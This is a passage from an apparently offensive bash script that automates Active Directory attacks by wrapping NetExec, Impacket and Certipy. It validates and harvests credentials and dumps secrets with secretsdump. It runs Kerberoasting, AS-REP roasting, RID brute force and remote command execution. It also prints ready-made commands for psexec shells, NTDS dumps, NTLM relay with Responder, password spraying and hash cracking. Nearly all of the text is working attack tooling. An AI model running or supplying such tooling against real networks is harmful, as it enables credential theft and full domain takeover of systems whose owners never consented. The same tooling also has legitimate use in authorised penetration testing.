    echo "$output" | grep -a "\[+\]" | sed 's/\x1b\[[0-9;]*m//g' | while read -r line; do
        local cred=$(echo "$line" | sed 's/.*\[+\] //')
        if [ -n "$cred" ]; then
            if ! grep -qxF "$cred" "$VALID_CREDS_FILE" 2>/dev/null; then
                echo "$cred" >> "$VALID_CREDS_FILE"
            fi
        fi
    done

    # Harvest password change required
    echo "$output" | grep -a "STATUS_PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | sed 's/\x1b\[[0-9;]*m//g' | while read -r line; do
        local cred=$(echo "$line" | sed 's/.*[-] //' | cut -d' ' -f1)
        if [ -n "$cred" ]; then
            if ! grep -qxF "$cred" "$POTENTIAL_CREDS_FILE" 2>/dev/null; then
                echo "$cred (PASSWORD_MUST_CHANGE)" >> "$POTENTIAL_CREDS_FILE"
            fi
        fi
    done
    
    # Check for success indicator "[+]"
    if echo "$output" | grep -q "+"; then
        # If user is a file (list), sanitizing to just 'USER' for display purposes in suggestions
        # The true username will be available if auto-promotion runs, but here we just want a clean string
        display_user="$user"
        if [ -f "$user" ]; then
             display_user="USER"
        fi

        log_success "Valid credentials for $service! Suggested command:"

        
        # Prepare credential strings
        if [ -n "$domain" ] && [ "$USE_LOCAL_AUTH" != "true" ]; then
             display_user_winrm="$domain\\$display_user"
        else
             display_user_winrm="$display_user"
        fi

        if [ -n "$hash" ]; then
            IMPACKET_CREDS="$domain/$display_user@$IP -hashes :$hash"
            WINRM_CREDS="-i $IP -u '$display_user_winrm' -H '$hash'"
            if [ -n "$domain" ]; then
                SMBCLIENT_AUTH="-U '$domain\\$display_user' --pw-nt-hash $hash"
                SMBGET_USER="$domain/$display_user%$hash"
                SMBMAP_CREDS="-u '$display_user' -p '$hash' -d '$domain'"
            else
                SMBCLIENT_AUTH="-U '$display_user' --pw-nt-hash $hash"
                SMBGET_USER="$display_user%$hash"
                SMBMAP_CREDS="-u '$display_user' -p '$hash'"
            fi
            XFREERDP_PASS="/pth:$hash"  # For xfreerdp3 with hash
        else
            IMPACKET_CREDS="$domain/$display_user:$pass@$IP"
            WINRM_CREDS="-i $IP -u '$display_user_winrm' -p '$pass'"
            if [ -n "$domain" ]; then
                SMBCLIENT_AUTH="-U '$domain\\$display_user%$pass'"
                SMBGET_USER="$domain/$display_user%$pass"
                SMBMAP_CREDS="-u '$display_user' -p '$pass' -d '$domain'"
            else
                SMBCLIENT_AUTH="-U '$display_user%$pass'"
                SMBGET_USER="$display_user%$pass"
                SMBMAP_CREDS="-u '$display_user' -p '$pass'"
            fi
            XFREERDP_PASS="/p:'$pass'"  # For xfreerdp3 with password
        fi

        case $service in
            "smb")
                # Suggest Impacket tools for SMB
                log_warning "Impacket tools for SMB:"
                echo "impacket-psexec $IMPACKET_CREDS"
                echo "impacket-smbexec $IMPACKET_CREDS"
                
                # Check for Admin access (Pwn3d!)
                if echo "$output" | grep -q "Pwn3d!"; then
                     log_success "Admin access (Pwn3d!) detected - tools above will work!"
                else
                     log_error "Note: Admin tools above require elevated privileges"
                fi
                echo ""

                # Enumerate shares to see which ones are accessible
                log_info "Enumerating shares for suggestions..."
                # Use the already captured output if it contains shares, or run it if needed.
                # Since we are optimizing to run --shares in the main call, we use $output.
                shares_output="$output"
                
                # Check for writable shares and display prominent notice
                writable_shares=$(echo "$shares_output" | sed 's/\x1b\[[0-9;]*m//g' | grep "WRITE" | awk '{for(i=1;i<=NF;i++) if($i ~ /WRITE/) {print $(i-1); next}}' | sed 's/^\\\//')
                if [ -n "$writable_shares" ]; then
                    log_error "WRITABLE SHARES FOUND - Potential for privilege escalation!"
                    log_warning "Writable shares for user '${display_user}':"
                    echo "$shares_output" | while read -r line; do
                        clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                        if [[ "$clean_line" == *"WRITE"* ]]; then
                            share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ,WRITE|WRITE)$/) {print $(i-1); exit}}')
                            share=${share#\\}
                            if [ ! -z "$share" ]; then
                                echo -e "  - ${BRED}$share${NC}"
                                log_info "Upload file to $share:"
                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'put local_file.txt remote_file.txt'"
                            fi
                        fi
                    done
                    echo ""
                    log_success "Exploitation suggestions:"
                    echo "# Upload malicious files, DLL hijacking, or SCF/LNK attacks"
                    echo "# Check for startup folders, scripts, or scheduled tasks"
                    echo ""
                fi
                
                log_success "Suggested connections:"
                echo "$shares_output" | while read -r line; do
                    # Clean color codes for parsing
                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                    
                    # Check for accessible shares (READ or WRITE)
                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                        # Extract share name (it is the field before READ or WRITE)
                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ|WRITE|READ,WRITE)$/) {print $(i-1); exit}}')
                        
                        # Remove leading backslash if present
                        share=${share#\\}
                        
                        if [ ! -z "$share" ]; then
                            echo "smbclient $SMBCLIENT_AUTH //$IP/$share"
                        fi
                    fi
                done
                
                # Add recursive download suggestions
                echo ""
                log_success "Download all files from shares:"
                echo "$shares_output" | while read -r line; do
                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ|WRITE|READ,WRITE)$/) {print $(i-1); exit}}')
                        share=${share#\\}
                        if [ ! -z "$share" ]; then
                            log_info "Download $share recursively:"
                            if [ -n "$hash" ]; then
                                echo "# Recursively download all files (Best way):"
                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
                                echo ""
                                echo "# Download specific file with smbmap:"
                                echo "smbmap $SMBMAP_CREDS -H $IP --download '$share\\path\\to\\file'"
                                echo "# Note: smbget doesn't support --pw-nt-hash"
                            else
                                echo "# Recursively download all files (Best ways):"
                                echo "smbget -R smb://$IP/$share -U '$SMBGET_USER'"
                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
                                echo ""
                                echo "# Download specific file with smbmap:"
                                echo "smbmap $SMBMAP_CREDS -H $IP --download '$share\\path\\to\\file'"
                            fi
                            echo ""
                        fi
                    fi
                done
                
                # Add remote execution tool suggestions
                log_success "Remote execution tools:"
                if echo "$output" | grep -q "Pwn3d!"; then
                    log_info "Admin access detected - these tools should work:"
                    echo "impacket-wmiexec $IMPACKET_CREDS  # (or wmiexec.py)"
                    echo "impacket-psexec $IMPACKET_CREDS   # (or psexec.py)"
                    echo "impacket-smbexec $IMPACKET_CREDS  # (or smbexec.py)"
                    echo "impacket-atexec $IMPACKET_CREDS   # (or atexec.py)"
                else
                    log_warning "No admin access - these tools may fail:"
                    echo "impacket-wmiexec $IMPACKET_CREDS  # Requires admin (or wmiexec.py)"
                    echo "impacket-psexec $IMPACKET_CREDS   # Requires admin (or psexec.py)"
                fi
                ;;
            "wmi")
                if echo "$output" | grep -q "Pwn3d!"; then
                     log_success "Admin access (Pwn3d!) detected - impacket-wmiexec should work!"
                else
                     log_warning "Valid credentials, but Admin access not detected. impacket-wmiexec might fail (Access Denied)."
                fi
                echo "impacket-wmiexec $IMPACKET_CREDS"
                ;;
            "winrm")
                log_success "WinRM Shell access! Suggested shell tool:"
                echo "evil-winrm $WINRM_CREDS"
                if [ "$USE_LOCAL_AUTH" = "true" ]; then
                     log_info "Note: Successful login was found to be a local account."
                fi
                echo ""
                log_info "Or execute command with NetExec:"
                if [ "$USE_LOCAL_AUTH" = "true" ]; then
                     echo "nxc winrm $IP $USER_FLAG --local-auth -x whoami"
                else
                     echo "nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami"
                fi
                ;;
            "mssql")
                echo "impacket-mssqlclient $IMPACKET_CREDS"
                ;;
            "ssh")
                echo "ssh '$display_user@$IP'"
                ;;
            "ftp")
                echo "ftp ftp://$display_user:$pass@$IP"
                ;;
            "vnc")
                echo "vncviewer $IP"
                ;;
            "ldap")
                # LDAP enumeration tools
                log_section "LDAP Enumeration Tools"
                
                # Check for Admin access (Pwn3d!)
                if echo "$output" | grep -q "Pwn3d!"; then
                    log_error "Domain Admin access (Pwn3d!) detected! You can dump NTDS hashes."
                    log_success "Suggested exploitation commands:"
                    echo "nxc smb $IP $USER_FLAG --ntds"
                    echo "impacket-secretsdump $IMPACKET_CREDS"
                    echo ""
                fi

                if [ -n "$domain" ]; then
                    local base_dn="DC=${domain//./,DC=}"
                    
                    if [ -n "$hash" ]; then
                        log_info "NetExec LDAP enumeration:"
                        echo "nxc ldap $IP $DOMAIN_FLAG -u '$display_user' -H '$hash' --users"
                        echo "nxc ldap $IP $DOMAIN_FLAG -u '$display_user' -H '$hash' --bloodhound -c All"
                        echo ""
                        log_info "ldapdomaindump (requires password, not hash):"
                        echo "# ldapdomaindump -u '$domain\\$display_user' -p 'PASSWORD' ldap://$IP"
                    else
                        log_info "Suggested LDAP Commands:"
                        printf "  - ldapsearch:         ldapsearch -x -H ldap://%s -D \"%s@%s\" -w '%s' -b \"%s\" \"(objectClass=*)\"\n" "$IP" "$display_user" "$domain" "$pass" "$base_dn"
                        printf "  - ldapdomaindump:     ldapdomaindump -u '%s\\%s' -p '%s' ldap://%s\n" "$domain" "$display_user" "$pass" "$IP"
                        printf "  - BloodHound:         bloodhound-python -u '%s' -p '%s' -d %s -ns %s -c All\n" "$display_user" "$pass" "$domain" "$IP"
                        printf "  - NetExec:            nxc ldap %s %s -u '%s' -p '%s' --users --bloodhound -c All\n" "$IP" "$DOMAIN_FLAG" "$display_user" "$pass"
                    fi
                else
                    log_warning "Domain name required for LDAP tools. Specify with -d flag"
                fi
                ;;
        esac
        
        # RDP specific
        if [ "$service" == "rdp" ]; then
            if [ -n "$domain" ]; then
                 echo "xfreerdp3 /v:$IP /u:'$display_user' $XFREERDP_PASS /d:'$domain' /dynamic-resolution +clipboard /cert:ignore"
                 echo "rdesktop -u '$display_user' -p '$pass' -d '$domain' $IP"
            else
                 echo "xfreerdp3 /v:$IP /u:'$display_user' $XFREERDP_PASS /dynamic-resolution +clipboard /cert:ignore"
                 echo "rdesktop -u '$display_user' -p '$pass' $IP"
            fi
            echo "remmina -c rdp://$display_user:$pass@$IP"
        fi
        echo ""
    fi
}


# Credential validation (Windows-specific)
if [ "$os_type" = "windows" ]; then
    log_section "Credential Validation"
    # Build optional flags
    # Flags already built at the top
    
    # SMB (anonymous allowed, domain optional)
    # Added --shares to check shares in one go
    if check_port $IP 445; then
        smb_output=$(check_and_suggest smb nxc smb $IP $DOMAIN_FLAG $USER_FLAG --shares --continue-on-success --timeout 30)
        echo "$smb_output"
        promote_verified_creds
    else
        smb_output="" # Empty output if closed
    fi
    
    # Check for SMB signing status
    clean_smb_output=$(echo "$smb_output" | sed 's/\x1b\[[0-9;]*m//g')
    if echo "$clean_smb_output" | grep -q "signing:True"; then
        log_warning "SMB Signing is ENABLED"
        log_info "Impact:"
        echo "  - NTLM relay attacks to SMB are NOT possible"
        echo "  - SMB traffic is cryptographically signed"
        echo ""
        log_info "What you CAN still do:"
        echo ""
        log_info "1. NTLM Relay to LDAP/MSSQL/HTTP:"
        echo "  ntlmrelayx.py -t ldap://$IP --escalate-user lowpriv"
        echo "  ntlmrelayx.py -t ldap://$IP --delegate-access"
        echo ""
        log_info "2. Password Spraying:"
        echo "nxc smb $IP -u users.txt -p 'Password123' --continue-on-success"
        echo "nxc smb $IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success"
        echo ""
        log_info "3. Kerberoasting (extract and crack service account passwords):"
        echo "nxc ldap $IP -u '$user' -p '$pass' --kerberoasting kerberoast.txt"
        echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt"
        echo ""
        log_info "4. AS-REP Roasting (accounts without pre-auth):"
        echo "GetNPUsers.py $domain/ -usersfile users.txt -no-pass -dc-ip $IP"
        echo ""
        log_info "5. Enumerate users for further attacks:"
        echo "nxc smb $IP -u '' -p '' --rid-brute"
        echo "lookupsid.py -no-pass anonymous@$IP"
        echo ""
        log_info "6. Check for common vulnerabilities:"
        echo "nxc smb $IP -u '$user' -p '$pass' -M zerologon"
        echo "nxc smb $IP -u '$user' -p '$pass' -M petitpotam"
        echo ""
        log_info "7. LDAP enumeration and attacks:"
        echo "nxc ldap $IP -u '$user' -p '$pass' --bloodhound -c All"
        echo "nxc ldap $IP -u '$user' -p '$pass' --users --admin-count"
        echo ""
    elif echo "$clean_smb_output" | grep -q "signing:False"; then
        log_success "SMB Signing is DISABLED - NTLM relay attacks possible!"
        log_info "Exploitation suggestions:"
        echo "  # NTLM Relay to SMB:"
        echo "  ntlmrelayx.py -tf targets.txt -smb2support"
        echo ""
        echo "  # NTLM Relay to LDAP (for privilege escalation):"
        echo "  ntlmrelayx.py -t ldap://$IP --escalate-user lowpriv"
        echo ""
        echo "  # Capture and relay with Responder:"
        echo "  responder -I eth0 -wv"
        echo "  ntlmrelayx.py -tf targets.txt -smb2support"
        echo ""
    fi
    
    # LDAP requires username (domain optional)
    if [ -n "$user" ]; then
        log_info "Validating LDAP credentials..."
        check_and_suggest ldap nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --continue-on-success --timeout 30
        promote_verified_creds
    else
        log_warning "Skipping LDAP check (no username supplied)"
    fi
    
    # RDP check (requires username)
    if [ -n "$user" ]; then
        if check_port $IP 3389; then
            log_section "RDP Enumeration"
            log_info "RDP Credentials Check"
            rdp_output=$(check_and_suggest rdp nxc rdp $IP $DOMAIN_FLAG $USER_FLAG --continue-on-success)
            echo "$rdp_output"
            promote_verified_creds
            
            # Check if RDP access was successful
            if echo "$rdp_output" | grep -q "\[+\]"; then
                log_success "RDP access successful! Connect with:"
                if [ -n "$domain" ]; then
                    echo "xfreerdp3 /v:$IP /u:$domain\\\\$display_user $XFREERDP_PASS /cert:ignore /clipboard /dynamic-resolution"
                else
                    echo "xfreerdp3 /v:$IP /u:$display_user $XFREERDP_PASS /cert:ignore /clipboard /dynamic-resolution"
                fi
                echo ""
                log_info "Or with rdesktop:"
                if [ -n "$domain" ]; then
                    echo "rdesktop -u $display_user -p '$pass' -d $domain $IP"
                else
                    echo "rdesktop -u $display_user -p '$pass' $IP"
                fi
                echo ""
                log_info "Or with Remmina (command line):"
                if [ -n "$domain" ]; then
                    echo "remmina -c 'rdp://$domain\\\\$display_user:$pass@$IP'"
                else
                    echo "remmina -c 'rdp://$display_user:$pass@$IP'"
                fi
                echo ""
            fi
        else
            log_warning "Skipping RDP check (Port 3389 closed)"
        fi
    else
        log_warning "Skipping RDP check (no username supplied)"
    fi
fi

# WinRM requires cr
# nxc rdp $IP -u $user -p $pass # RDP
# nxc ftp $IP -u $user -p $pass # FTP

# Skip all Windows-specific enumeration for Linux targets
if [ "$os_type" = "windows" ]; then
    # RPC enumeration - works with username only (null password)
    if [ -n "$user" ]; then
        log_section "RPC Enumeration (rpcclient)"
        print_cmd "rpcclient $RPC_ARG $IP -c \"queryuser 0\""
        rpcclient $RPC_ARG $IP -c "queryuser 0" 2>/dev/null # RPC user query
        print_cmd "rpcclient $RPC_ARG $IP -c \"enumdomusers\""
        rpcclient $RPC_ARG $IP -c "enumdomusers" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomusers.txt # Enumerate domain users via RPC
        print_cmd "rpcclient $RPC_ARG $IP -c \"enumdomgroups\""
        rpcclient $RPC_ARG $IP -c "enumdomgroups" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomgroups.txt # Enumerate domain groups via RPC
        
        # Extract usernames to a clean list
        if [ -f nxc-enum/smb/rpc-enumdomusers.txt ] && grep -q "user:" nxc-enum/smb/rpc-enumdomusers.txt; then
            # Notify if overwriting existing file
            if [ -f rpcuserlist.txt ]; then
                log_warning "Overwriting existing rpcuserlist.txt"
            fi
            
            grep "user:" nxc-enum/smb/rpc-enumdomusers.txt | awk -F'[][]' '{print $2}' > rpcuserlist.txt
            user_count=$(wc -l < rpcuserlist.txt)
            log_success "Extracted $user_count usernames to: ${BWHITE}rpcuserlist.txt${NC}"
            echo ""
            log_info "Suggested attacks with this user list:"
            echo ""
            log_info "1. Password spraying with NetExec:"
            echo "nxc smb $IP -u rpcuserlist.txt -p 'Password123' --continue-on-success"
            echo "nxc smb $IP -u rpcuserlist.txt -p passwords.txt --no-bruteforce --continue-on-success"
            echo ""
            log_info "2. Password spraying with kerbrute:"
            if [ -n "$domain" ]; then
            echo "kerbrute passwordspray -d $domain --dc $DC_IP rpcuserlist.txt 'Password123'"
            echo "kerbrute bruteuser -d $domain --dc $DC_IP passwords.txt username"
            echo ""
            log_info "3. AS-REP roasting (no password needed):"
            echo "GetNPUsers.py $domain/ -usersfile rpcuserlist.txt -no-pass -dc-ip $DC_IP"
            echo ""
            log_info "4. Validate usernames with kerbrute:"
            echo "kerbrute userenum -d $domain --dc $DC_IP rpcuserlist.txt"
            else
            echo "kerbrute passwordspray -d DOMAIN --dc $DC_IP rpcuserlist.txt 'Password123'"
            echo ""
            log_info "3. AS-REP roasting (no password needed):"
            echo "GetNPUsers.py DOMAIN/ -usersfile rpcuserlist.txt -no-pass -dc-ip $DC_IP"
            echo ""
            log_info "Note: Specify domain with -d flag for kerbrute commands"
            fi

            echo ""
        fi
        
        # secretsdump requires actual credentials
        if [ -n "$pass" ] || [ -n "$hash" ]; then
            log_section "RPC Secrets Dump"
            print_cmd "impacket-secretsdump $SECRETS_ARG"
            impacket-secretsdump $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt
            if [ ! -s nxc-enum/smb/rpc-secretsdump.txt ]; then
                print_cmd "secretsdump.py $SECRETS_ARG"
                secretsdump.py $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt
            fi
        else
            log_warning "Skipping RPC Secrets Dump (requires password/hash)"
        fi
    else
        log_warning "Skipping RPC Enumeration (no username supplied)"
    fi
    
    log_section "RPC Endpoint Dump"
    timestamp=$(date +%Y%m%d_%H%M%S)
    print_cmd "impacket-rpcdump \"$IP\" $RPCDUMP_ARG"
    impacket-rpcdump "$IP" $RPCDUMP_ARG 2>/dev/null > "nxc-enum/rpc_endpoints_${timestamp}.txt"
    if [ ! -s "nxc-enum/rpc_endpoints_${timestamp}.txt" ]; then
        print_cmd "rpcdump.py \"$IP\" $RPCDUMP_ARG"
        rpcdump.py "$IP" $RPCDUMP_ARG 2>/dev/null > "nxc-enum/rpc_endpoints_${timestamp}.txt"
    fi
    log_info "Results saved to: ${BWHITE}nxc-enum/rpc_endpoints_${timestamp}.txt${NC}"
    
    if [ -n "$user" ]; then
        if check_port $IP 5985 || check_port $IP 5986; then
            log_section "WinRM Enumeration"
            log_info "WinRM Credentials Check"
            check_and_suggest winrm nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --continue-on-success --timeout 120 --http-timeout 120 | tee nxc-enum/smb/winrm-credentials.txt
        
            log_info "WinRM Command Execution (whoami)"
            print_cmd "nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --timeout 120 --http-timeout 120 -x whoami"
            unbuffer nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --timeout 120 --http-timeout 120 -x whoami | tee nxc-enum/smb/winrm-whoami.txt
        else
            log_warning "Skipping WinRM check (Ports 5985/5986 closed)"
        fi
    else
        log_warning "Skipping WinRM Enumeration (no username supplied)"
    fi
    
    # Redundant share listing removed (already checked in validation)
    # User enumeration removed (already done in initial LDAP domain SID check at line ~100)
    
    if [ -n "$user" ]; then
        log_section "Logged On Users"
        print_cmd "nxc smb $IP $USER_FLAG --loggedon-users"
        unbuffer nxc smb $IP $USER_FLAG --loggedon-users 2>/dev/null | tee nxc-enum/smb/logged-users.txt
    
        log_section "Admin User Count"
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --admin-count"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --admin-count  --timeout 15 2>/dev/null | tee nxc-enum/ldap/admin-count-users.txt
    
        log_section "RID Brute Force"
        print_cmd "nxc smb $IP $USER_FLAG --rid-brute"
        unbuffer nxc smb $IP $USER_FLAG --rid-brute 2>/dev/null | tee nxc-enum/smb/rid-bruteforce.txt
    
        log_section "Domain Groups"
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --groups"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --groups  --timeout 15 2>/dev/null | tee nxc-enum/smb/domain-groups.txt
    
        log_section "Local Groups"
        print_cmd "nxc smb $IP $USER_FLAG --local-groups"
        unbuffer nxc smb $IP $USER_FLAG --local-groups 2>/dev/null | tee nxc-enum/smb/local-groups.txt
    
        log_section "Password Policy"
        print_cmd "nxc smb $IP $USER_FLAG --pass-pol"
        unbuffer nxc smb $IP $USER_FLAG --pass-pol 2>/dev/null | tee nxc-enum/smb/pw-policy.txt
    
        log_section "Remote Command Execution (whoami)"
        print_cmd "nxc smb $IP $USER_FLAG -x whoami"
        nxc smb $IP $USER_FLAG -x whoami 2>/dev/null
        print_cmd "nxc smb $IP $USER_FLAG -X '\$PSVersionTable'"
        nxc smb $IP $USER_FLAG -X '$PSVersionTable' 2>/dev/null
        print_cmd "nxc wmi $IP $USER_FLAG -x whoami"
        nxc wmi $IP $USER_FLAG -x whoami 2>/dev/null
        print_cmd "nxc winrm $IP $USER_FLAG -x whoami"
        nxc winrm $IP $USER_FLAG -x whoami 2>/dev/null
    else
        log_warning "Skipping User/Group Enumeration & Command Execution (no username supplied)"
    fi
    
    # LDAP modules require actual authentication - skip if no password/hash
    if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
        log_section "GMSA Passwords"
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --gmsa"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --gmsa  --timeout 15 2>/dev/null | tee nxc-enum/ldap/gmsa.txt  
    
        log_section "Anti-Virus Check"
        print_cmd "nxc smb $IP $USER_FLAG -M enum_av"
        unbuffer nxc smb $IP $USER_FLAG -M enum_av 2>/dev/null | tee nxc-enum/ldap/anti_virus.txt  
    
        log_section "LDAP Module Enumeration"

        log_info "Running ldapdomaindump"
        mkdir -p nxc-enum/ldap/ldd
        
        if [ -n "$domain" ]; then
            ldd_user="$domain\\$user"
        else
            ldd_user="$user"
        fi
        
        if [ -n "$pass" ]; then
            print_cmd "ldapdomaindump -u \"$ldd_user\" -p \"$pass\" -o nxc-enum/ldap/ldd ldap://$IP"
            timeout 120s unbuffer ldapdomaindump -u "$ldd_user" -p "$pass" -o nxc-enum/ldap/ldd ldap://$IP 2>&1 | tee nxc-enum/ldap/ldapdomaindump.log
        elif [ -n "$hash" ]; then
            print_cmd "ldapdomaindump -u \"$ldd_user\" -p \"$hash\" -o nxc-enum/ldap/ldd ldap://$IP"
            timeout 120s unbuffer ldapdomaindump -u "$ldd_user" -p "$hash" -o nxc-enum/ldap/ldd ldap://$IP 2>&1 | tee nxc-enum/ldap/ldapdomaindump.log
        fi

        if [ -f nxc-enum/ldap/ldd/index.html ]; then
             log_success "ldapdomaindump report saved to: ${BWHITE}nxc-enum/ldap/ldd/index.html${NC}"
        fi
    
        log_info "Machine Account Quota (maq)"
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M maq"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M maq  --timeout 15 2>/dev/null | tee nxc-enum/ldap/maq.txt
    
        log_info "ADCS Templates"
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M adcs"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M adcs  --timeout 15 2>/dev/null | tee nxc-enum/ldap/adcs.txt
    
        log_info "User Descriptions"
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M get-desc-users"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M get-desc-users  --timeout 15 2>/dev/null | tee nxc-enum/ldap/desc-users.txt
    
        log_info "LDAP Checker"
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M ldap-checker"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M ldap-checker  --timeout 15 2>/dev/null | tee nxc-enum/ldap/ldap-checker.txt
    
        log_info "Password Not Required"
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --password-not-required"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --password-not-required  --timeout 15 2>/dev/null | tee nxc-enum/ldap/password-not-required.txt
    
        log_info "Trusted For Delegation"
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --trusted-for-delegation"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --trusted-for-delegation  --timeout 15 2>/dev/null | tee nxc-enum/ldap/trusted-for-delegation.txt
    
        log_section "AD CS Enumeration (Certipy)"
        # Check if certipy is in PATH, if not check distinct location
        CERTIPY_CMD="certipy"
        if ! command -v certipy &> /dev/null; then
             if [ -f "$HOME/.local/bin/certipy" ]; then
                 CERTIPY_CMD="$HOME/.local/bin/certipy"
             elif [ -f "$HOME/.local/bin/certipy" ]; then
                 CERTIPY_CMD="$HOME/.local/bin/certipy"
             elif [ -f "/usr/local/bin/certipy" ]; then
                 CERTIPY_CMD="/usr/local/bin/certipy"
             fi
        fi

        if command -v "$CERTIPY_CMD" &> /dev/null || [ -f "$CERTIPY_CMD" ]; then
             log_info "Running Certipy find..."
             # Construct Certipy command with user@domain if available (more reliable)
             certipy_run_cmd="$CERTIPY_CMD find"
             if [ -n "$domain" ]; then
                 certipy_run_cmd="$certipy_run_cmd -u '$user@$domain' -p '$pass' -target '$domain'"
             else
                 certipy_run_cmd="$certipy_run_cmd -u '$user' -p '$pass' -target '$IP'"
             fi
             
             # Run certipy find
             print_cmd "$certipy_run_cmd -dc-ip $DC_IP -vulnerable -enabled -stdout"
             eval "$certipy_run_cmd -dc-ip $DC_IP -vulnerable -enabled -stdout 2>/dev/null" | tee nxc-enum/ldap/certipy_output.txt
             
             if [ -s nxc-enum/ldap/certipy_output.txt ]; then
                 log_success "Certipy scan complete! Results saved to ${BWHITE}nxc-enum/ldap/certipy_output.txt${NC}"
                 log_info "Checking for vulnerable templates..."
                 grep -iE "ESC[0-9]" nxc-enum/ldap/certipy_output.txt || log_info "No obvious ESC vulnerabilities found in text output."
                 echo ""
                 log_info "View full report:"
                 echo "cat nxc-enum/ldap/certipy_output.txt"
             else
                 log_warning "Certipy run failed or no output generated."
             fi
        else
             log_warning "Certipy not found (checked PATH and ~/.local/bin). Skipping AD CS check."
             log_info "Install with: pipx install certipy-ad"
        fi

        log_section "Kerberoasting"
        rm -f nxc-enum/ldap/kerberoasting.txt kerberoasting.txt 2>/dev/null
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt  --timeout 15 2>/dev/null
        if [ -s nxc-enum/ldap/kerberoasting.txt ] && grep -q 'krb5tgs' nxc-enum/ldap/kerberoasting.txt 2>/dev/null; then
            cp nxc-enum/ldap/kerberoasting.txt ./kerberoasting.txt
            log_success "Kerberoast hashes found! Saved to ${BWHITE}kerberoasting.txt${NC}"
            log_info "Suggested cracking commands:"
            
            # Detect hash type and suggest correct mode
            if grep -q 'krb5tgs\$23\$' kerberoasting.txt 2>/dev/null; then
                log_info "etype 23 (RC4-HMAC) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
                echo "hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            if grep -q 'krb5tgs\$17\$' kerberoasting.txt 2>/dev/null; then
                log_info "etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
                echo "hashcat -m 19600 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            if grep -q 'krb5tgs\$18\$' kerberoasting.txt 2>/dev/null; then
                log_info "etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
                echo "hashcat -m 19700 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            echo ""
        fi
    
        log_section "AS-REProasting (LDAP)"
        rm -f nxc-enum/ldap/asreproasting.txt asreproasting.txt 2>/dev/null
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt  --timeout 15 2>/dev/null
        if [ -s nxc-enum/ldap/asreproasting.txt ] && grep -q 'krb5asrep' nxc-enum/ldap/asreproasting.txt 2>/dev/null; then
            cp nxc-enum/ldap/asreproasting.txt ./asreproasting.txt
            log_success "AS-REP hashes found! Saved to ${BWHITE}asreproasting.txt${NC}"
            log_info "Suggested cracking commands:"
            
            # Detect hash type and suggest correct mode
            if grep -q 'krb5asrep\$23\$' asreproasting.txt 2>/dev/null; then
                log_info "etype 23 (RC4-HMAC) detected"
